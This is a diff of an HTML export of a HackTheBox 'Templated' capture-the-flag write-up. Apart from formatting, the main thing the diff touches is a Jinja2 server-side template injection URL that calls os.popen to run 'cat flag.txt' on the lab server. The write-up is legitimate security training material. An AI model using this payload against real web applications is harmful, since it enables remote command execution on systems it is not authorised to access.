@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2023-07-14 Fri 07:43 -->
+<!-- 2023-07-14 Fri 07:50 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>HTB Templated</title>
@@ -29,14 +29,14 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orga7abdcc">Templated&#xa0;&#xa0;&#xa0;<span class="tag"><span class="htb">htb</span>&#xa0;<span class=""></span>&#xa0;<span class="templates">templates</span></span></a></li>
+<li><a href="#org06e3c72">Templated&#xa0;&#xa0;&#xa0;<span class="tag"><span class="htb">htb</span>&#xa0;<span class=""></span>&#xa0;<span class="templates">templates</span></span></a></li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-orga7abdcc" class="outline-2">
-<h2 id="orga7abdcc">Templated&#xa0;&#xa0;&#xa0;<span class="tag"><span class="htb">htb</span>&#xa0;<span class=""></span>&#xa0;<span class="templates">templates</span></span></h2>
-<div class="outline-text-2" id="text-orga7abdcc">
+<div id="outline-container-org06e3c72" class="outline-2">
+<h2 id="org06e3c72">Templated&#xa0;&#xa0;&#xa0;<span class="tag"><span class="htb">htb</span>&#xa0;<span class=""></span>&#xa0;<span class="templates">templates</span></span></h2>
+<div class="outline-text-2" id="text-org06e3c72">
 <ul class="org-ul">
 <li>Difficulty: very easy</li>
 </ul>
@@ -65,10 +65,9 @@ So by that logic
 </p>
 
 
-<div class="org-src-container">
-<pre class="src src-nil">http://134.209.18.1:31826/{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}
+<pre class="example">
+http://134.209.18.1:31826/{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}
 </pre>
-</div>
 
 <p>
 Would spawn cat and return the flag.
@@ -79,7 +78,7 @@ Would spawn cat and return the flag.
 <div id="postamble" class="status">
 <p class="author">Author:  (<a href="mailto:unseen@flake">unseen@flake</a>)</p>
 <p class="date">Date: </p>
-<p class="creator"><a href="https://www.gnu.org/software/emacs/">Emacs</a> 28.2 (<a href="https://orgmode.org">Org</a> mode 9.6.1)</p>
+<p class="creator"><a href="https://www.gnu.org/software/emacs/">Emacs</a> 28.2 (<a href="https://orgmode.org">Org</a> mode 9.5.5)</p>
 <p class="validation"></p>
 </div>
 </body>
